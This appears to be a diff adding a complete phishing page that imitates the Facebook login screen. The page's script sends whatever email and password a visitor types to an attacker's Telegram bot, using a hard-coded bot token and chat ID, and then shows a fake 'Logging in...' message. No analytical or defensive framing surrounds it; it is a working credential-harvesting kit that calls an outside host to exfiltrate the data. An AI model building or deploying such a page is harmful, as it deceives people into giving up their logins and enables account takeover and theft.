@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook – log in or sign up</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Helvetica, Arial, sans-serif;
+      background: #f0f2f5;
+    }
+
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+
+    .fb-logo {
+      color: #1877f2;
+      font-size: 50px;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+
+    .fb-text {
+      font-size: 24px;
+      margin-bottom: 20px;
+      color: #1c1e21;
+      text-align: center;
+    }
+
+    .login-box {
+      background: #fff;
+      padding: 20px;
+      width: 360px;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 14px;
+      margin: 10px 0;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      background-color: #1877f2;
+      border: none;
+      color: white;
+      font-size: 20px;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    button:hover {
+      background-color: #166fe5;
+    }
+
+    .footer-text {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #65676b;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="fb-logo">facebook</div>
+    <div class="fb-text">Connect with friends and the world around you on Facebook.</div>
+    <div class="login-box">
+      <input type="text" id="username" placeholder="Email or Phone Number" />
+      <input type="password" id="password" placeholder="Password" />
+      <button onclick="sendToTelegram()">Log In</button>
+    </div>
+    <div class="footer-text">Facebook © 2025</div>
+  </div>
+
+  <script>
+    function sendToTelegram() {
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      const message = `🔔 Facebook Login:\n📧 Username: ${username}\n🔒 Password: ${password}`;
+      const chatId = "7536984768";
+      const botToken = "8044754081:AAFb2-QhITbQQXNcsaAZ62nbSvr8_mi4_sA";
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      fetch(url, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        alert("Logging in...");
+      })
+      .catch(error => {
+        alert("Error sending to Telegram.");
+        console.error("Error:", error);
+      });
+    }
+  </script>
+</body>
+</html>
